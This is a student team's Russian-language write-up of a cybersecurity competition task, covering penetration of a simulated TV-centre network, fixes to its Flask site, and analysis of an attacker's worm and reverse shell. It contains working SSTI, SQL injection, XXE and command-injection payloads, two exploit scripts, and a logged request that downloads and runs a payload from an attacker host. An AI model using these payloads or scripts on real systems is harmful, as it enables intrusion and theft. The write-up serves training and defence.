# Командный этап КД НТИ по ИБ. Инженерная задача. Отчет команды Весёлая ферма.

## Задача
Телецентр подвергся хакерской атаке. Перед нами стоит задача – проникнуть в сеть, закрытую злоумышленниками, а затем выявить и исправить уязвимости. 

## Вход во внутреннюю сеть

### Начальное исследование

Сначала было произведено сканирование портов, найдены следующие:

| Порт  | Прот. | Описание                                   |
| ---   | ---   | ---                                        |
| 81    | HTTP  | Хостит обфусцированный файл run.py         |
| 5000  | HTTP  | Веб-приложение, сайт провайдера (?) NetGen |
| 8037  | UDP?  | Открыт, но не отвечает                     |
| 51515 | TCP   | Какой-то сервис, просит пароль             |


### Исследование сервисов
#### NetGen, порт 5000
На сервисе NetGen есть страницы `/register`, `/login`, `/logout` Регистрируем пользователя, доступна функция создания тикетов. В параметре POST `title` обнаружена SSTI (предположительно, Jinja2) Некоторые ключевые слова фильтруются, причем необязательно в составе пейлоада (например, `config`)

Далее нами было получено SSTI RCE в сервисе на :5000
![kts](https://user-images.githubusercontent.com/67109334/110940347-cf5fa280-8347-11eb-917d-432bcbc26336.png)

Для эксплуатации уязвимости был написан скрипт [netgen-shell.py](netgen-shell.py)

#### Взлом `run.py` на хосте :81

##### Сначала деобфусцируем скрипт:

 - Упростим имена, переименуем все в более понятный вид
 - Упростим hex-строки, получается encode, unhexlify и прочее
 - Избавимся от непонятных вызовов `locals()`, `getattr()`:
   - `getattr(binascii, 'unhexlify')(...)`
   - `binascii.unhexlify(...)`
   - `locals['somefunc'](..., ...)` 
   - `somefunc(..., ...)`
 - Последний шаг – избавимся от списков чисел. Можно заметить, что они используюстя только как аругмент к somefunc, при этом функция похожа на шифр Виженера. Для того, чтобы получить оригинальные строки, просто вызовем функцию с нужными аргументами. Выясняется, что большой список в начале файла – это зашифрованный приватный ключ RSA.

##### Алгоритм:
 - Загрузить ключ RSA
 - Получить hex-строку от пользователя
 - Расшифровать строку
 - Проверить соответствие с заданной строкой, если совпадают – вывести важную информацию

##### Исследование:
Приватный ключ дан почти в открытом виде, зашифруем с помощью него требуемую строку, затем подключимся к серверу на порту `:51515`, нас попросят ввести hex, отправим шифротекст, в ответ прилетит зашифрованная информация. С помощью скрипта и коюча ее расшифруем, получим сообщение с данными для входа во внутреннюю сеть

![kts](https://user-images.githubusercontent.com/67109334/110939654-cc17e700-8346-11eb-896b-367f495ac99b.png)

#### `server` на порту 80 и 8037

Это бинарь на Golang. Давайте попробуем подключиться с помощью `clientScript.py`. Этот сервер, кажется, не отвечает на наши ообщения, это означает, что нам надо зареверсить бинарь.

Давайте использовать IDA Free 7.0. Функции с основным кодом начинаются с `main_`:

#### Описание функций

| Функция                     | Описание                                   |
| ---                         | ---                                        |
| main.main                   | init function. Starts the server           |
| main.server                 | server func                                |
| main.listAllKeys            | lists all keys in the redis db             |
| main.RedisTestConnection    | puts test:connection into db, then gets it |
| main.RedisCreateUsers       | creates admin user entry in the db         |
| main.checkForExistence      | checks if the user already exists          |
| main.createMd5Password      | returns random md5 password string         |
| main.asyncHandleConnections | handles connections                        |
| main.readAndEncode          | utility function                           |


![kts](https://user-images.githubusercontent.com/67109334/110940047-5a8c6880-8347-11eb-9145-a3bff40562fa.png)

В `main.main` `os.Setenv` вызывается с аргументами `("ADMIN_PASS", "de4ea1a59bb6df9d2f6ddc61cc28ce29")`. Это, очевидно, пароль админа. Далее переменная окружения используется в `main.RedisCreateUsers`, который отправляет `admin:ADMIN_PASS` в `redis db`.

Теперь мы можем понять, как взаимодействовать с сервером.

![kts](https://user-images.githubusercontent.com/67109334/110940183-8dcef780-8347-11eb-80f0-e22d9b207303.png)

`main.asyncHandleConnections` – это большая функция, но нам станет проще её понять, если мы найдем строки, используемые в ней: 

```
^/register [0-9A-Za-z]{3,8}
/showall
/login
/logout
/get_screen
```

Логика для сравнения совпадения с последними тремя не такая уж простая, поэтому нам придётся угадывать. Давайте попробуем.

```
/login admin de4ea1a59bb6df9d2f6ddc61cc28ce29
/get_screen
```
Вывелась очень длинная строка base64. Скопировать из терминала не получается, поэтому давайте автоматизируем процесс:

```
from pwn import remote

r = remote("195.19.98.103", 8037)
r.sendline("/login admin de4ea1a59bb6df9d2f6ddc61cc28ce29")
r.recv()
r.sendline("/get_screen")

data = r.recvuntil("==") # sadly no \n
from base64 import b64decode

with open("screeen.jpeg", "wb") as f:
    f.write(b64decode(data))
```

![kts](https://user-images.githubusercontent.com/67109334/110940251-a50de500-8347-11eb-8f00-64d13faa5db7.png)

После запуска скрипта мы получаем инструкцию, как подключиться ко всей сети.

## Внутри сети телецентра. 

### Начальные шаги
Нам предлагается подключиться по `ssh` к `user31@nti-infobez.ru:10032`, что мы и делаем. Смотря процессы, мы можем заметить `python3 server.py`. Значит, на сервере запущено веб-приложение. Подключиться сразу не получится, так как сервер находится за NAT. Решение простое – пробросим порт 5000 через `ssh`:
```bash
ssh -p10032 user31@nti-infobez.ru -L 5000:127.0.0.1:5000 -L 13337:127.0.0.1:13337
```
Мы также пробросили порт 13337 для других коммуникаций.

В корневой директории есть папка `app`, в которой находится приложение. Отправим её себе на машину для удобства:
```bash
tar -czvf app.tar.gz /app 
python3 -m http.server 13337
```

Больше на сервере сервисов не запущено, поэтому мы можем приступать к анализу веб-приложения.

### Сайт телецентра

Сайт телецентра написан на Python 3 с использованием фреймворка Flask. В качестве СУБД используется sliqte3.

Найдем уязвимости.

### Основные уязвимости
#### SQLi №1

В ходе тестирования на проникновение, «Веселая ферма» смоделировала возможные действия злоумышленника на сайте телецентра “Sirius Game” и выявила возможность проведения атаки типа SQLi. Данная уязвимость даёт злоумышленнику возможность получения конфиденциальной информации пользователей, а именно переписок в личных диалогах.

Для эксплуатации описанной выше уязвимости, необходимо послать GET запрос на страницу `/dialog`. В качестве уязвимого параметра используется `u`, в функционале сервиса он необходим для указания собеседника, переписку с которым необходимо загрузить.

Полезной нагрузкой в данном векторе атаки может быть `" or "1" = "1" --`, однако не отрицаются другие варианты эксплуатирования данной уязвимости. 

Уязвимость расположена в функции `get_dialog()` и устраняется безопасной передачей (экранированием) аргументов в SQL-запрос.

#### SQLi №2

Для эксплуатации уязвимости необходимо зарегистрировать аккаунт с логином `[username]"--`, где username это логин атакуемого пользователя, например `admin"--`. Следующим шагом необходимо сменить пароль созданного пользователя, воспользовавшись функционалом `/change_passwd`. После выполнения этих шагов, злоумышленник получает доступ к аккаунту атакуемого пользователя и может войти в систему с данными `[username]:[new password]`

Уязвимость расположена в функции `change_user_passwd()` и устраняется безопасной передачей (экранированием) аргументов в SQL-запрос.

#### SQLi #3

Третья SQL-инъекция расположена на странице входа. Она позволяет входить без указания пароля. Достаточно использовать учетные данные `user`:`" or "1"="1" --`

Уязвимость расположена в функции `check_user_passwd()` и устраняется безопасной передачей (экранированием) аргументов в SQL-запрос.

#### XML XXE

Используя такую нагрузку как `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`, мы можем читать любой файл на сервере. Но это нельзя сделать через пользовательский интерфейс, поэтому нам придется делать прямой POST-запрос или добавить кнопку на страницу в нашем браузере.

Также мы можем создать [скрипт](xxe.py), который автоматически скачивает файлы с сервера и выводит его в консоль.

#### Удаленное выполнение команд

В веб приложении есть критическая уязвимость на удаленное выполнение команд. Страница `/status` принимает `GET`-параметр `q`, который передаётся в функцию `system()`. Отправив `1; cat /etc/passwd` мы прочитаем соответствующий файл. Выполнить можно любую команду, сервер фильрует только `whoami`, `id`, `python`, `php`, `bash`.

### Дополнительные уязвимости
#### Контроль доступа

Проверка на авторизованность отсутсвует на страницах:
 - `/add_news`, `/import_news` – можно публиковать новости без входа. 
 - `/staff` – можно получить спискок логинов для перебора паролей.
 - `/status` – служебная информация должна быть доступна только администратору.
В коде приложения уже присутствовала проверка на активность сессии, однако ничего не происходило, если сессии не было. Теперь при попытке зайти на эти страницы происходит перенаправление на `/login`

Также была возможность отправлять сообщения несуществующим пользователям. Мы решили исправить эту уязвимость для предотвращения спама.

При логине также создается сессия, которая сохраняется на протяжении двух лет, что потенциально снижат безопасность. Поэтому мы снизили срок годности до 1 месяца.


#### Слабая парольная политика
Также была выявлена слабая парольная политика. Это делает возможным брутфорс паролей за разумное время. Мы исправили это, введя проверку пароля при регистрации и смене по регулярному выражению. Были исправлены функции `reg_route()` и `password_route()` (`/registration` и `/change_passwd` соответственно), добавлен вывод соответствующей ошибки в темплейты.

Регулярные выражения: `^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&_-])[A-Za-z\d@$!%*?&_-]{8,}$`

Правила:
 - Минимальная длина 8 символов
 - 1 заглавная буква
 - 1 прописная строчная
 - 1 цифра
 - 1 спецсимвол

#### Хранение паролей в открытом виде
Пароли хранились в открытом виде, что означает полную компрометацию при утечке базы данных. Значит, нужно улучшить способ хранения паролей в базе данных. Мы решили хранить пароли в виде `sha256(pwd+salt)`.

## Расследование атаки
### Обнаружение

В ходе мониторинга веб-сервера были обнаружены следующие запросы:

```
10.1.2.15 - - [12/Mar/2021 16:30:03] "GET /status?q=1;wget%20http%3A%2F%2F10.1.76.31%2Fupdate%20-O%20%2Ftmp%2Fupdate%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fupdate%20%26%26%20cd%20%2Ftmp%20%26%26%20.%2Fupdate%20%26%26%20rm%20%2Ftmp%2Fupdate HTTP/1.1" 200 -
```

Это запрос к `/status`, в которой ранее была обнаружена уязвимость RCE.

### Вредоносный скрипт `update`

Скачаем файл. При открытии ничего не понятно, но на самом деле это достаточно простая обертка. Строки вида `$@$@$@$@$@...` на самом деле ничего не значат, но внутри них посимвольно записаны команды `echo '...' | base64 -d | bash`. Получается, большая base64-строка – это собственно вредоносный скрипт.

Декодируем строку, получается скрипт. Заменим точки с запятой на переводы строк, получим немного более читаемый скрипт. Названия функций и переменных обфусцированны, также содержание строк зашифровано. Расшифруем строки, чтобы понять, что в них содерижтся – по сожержимому установим понятные названия для переменных. Шифрование простое: символы просто смещаются на 1 вперед (`a -> b`).

Можно заметить в строках две команды, которые скачивают из запускают еще файлы. `doker-proxy` – бинарный вредоносный файл, который, возможно, связан с `docker`, `update` – сам вредоносный скрипт.

Изучим две функции внизу.

Первая, как видно по достаточно читаемому коду, подключается по `ssh` к каждому из известных IP в `~/.ssh/known_hosts` и выполняет скрипт – значит, скрипт помимо вредоносных действий заражает известные компьютеры.

Далее скрипт скачивает файл `doker-proxy` и запускает его в фоновом режиме (анализ см. далее). Затем скрипт добавляет в `cron` правило, по которому он будет скачитваться и запускаться с некоторой периодичностью (чтобы после удаления скрипт снова попал в систему).

Если скрипт запускается с правами суперпользователя, удаляются все учетные записи, имеющие распространённые навзания (например, `www`). Затем с помощью скриптов на `pastebin.com` добавляются два пользователя с домашней папкой `/root/` и определенной записью в `/etc/shadow`.

Затем скрипт удаляет ранее скачанные и завершает работу.

### Анализ вредоноса `doker-proxy`

Бинарный исполняемый файл `doker-proxy` используется как reverse shell в зараженную систему.

Алгоритм работы такой:

 - Получется fingerprint системы, содержащий имя пользователя, имя хоста.
 - Клиент подкючается к IP `10.1.76.31`, но после 4 неудачных попыток (10-70 сек между каждой) также пробует `15.234.10.15`.
 - Затем клиент отсылает fingerprint, предварительно поксорив его с ключом `b"\x03\"\xa7\x14\xbe\xc4\x00-\xf1\xf7\xc7\x1ehI#\xca"`
 - Клиент считывает байты ответа.
 - Если первые два байта равны `b'\xcd\x0c'` то передаем текст далее в `system()`

### Устранение и предотвращение атаки

Для того, чтобы удалить вредоносные файлы из системы, сначала отключим правило `cron`, которое периодически скачивает и выполняет файлы снова, а затем мы можем остановить процесс `doker-proxy`

Уязвимость, позволившая выполнить вредоносный скрипт на сервере, была закрыта ранее, а для предотвращения атаки с помощью `doker-proxy` мы нашли два решения:
 - Простое – заблокировать IP атакующего.
 - Более надежное – фильтровать то, что присылается по порту `1443`, если оно начинается на байты `cd 0c` – поднять тревогу.

# Приложения
### `netget-shell.py`

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from base64 import b64decode

"""
Payload:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|
attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')(request.args['cmd'] + ' | base64')|attr('read')()}}
"""

def run_cmd(cmd: str):
    req = requests.get("http://195.19.98.103:5000/tickets/b506e809d4484197f4b85f0a1db9fe72",
            params={'cmd': cmd},
            cookies={'session': '<your-session-cookie-here>'}
            )
    if req.status_code != 200:
        print(f'Error! {req.status_code}')
        return

    soup = BeautifulSoup(req.text, 'lxml')
    output = soup.find('div', {'class': 'card-header'}).text
    return b64decode(output).decode()

if __name__ == '__main__':
    while True:
        cmd = input("cmd> ")
        output = run_cmd(cmd)
        print(output)
```

### `xxe.py`
```python
import sys

from bs4 import BeautifulSoup
import requests
import html

payload = \
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://{}'>]><root>&test;</root>"""
url = "http://localhost:5000/import_news"

def exploit(f):
    print(f)
    r = requests.post(
        "http://127.0.0.1:5000/import_news",
        data={'xml': payload.format(f)}
    )
    if r.status_code != 200:
        print(f"Request error: {r.status_code}")
        exit(1)
    return html.unescape(BeautifulSoup(r.text, "lxml").p.text)[14:-7]

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: xxe.py <filename>")

    filename = sys.argv[1]
    print(
        exploit(filename)
    )
```
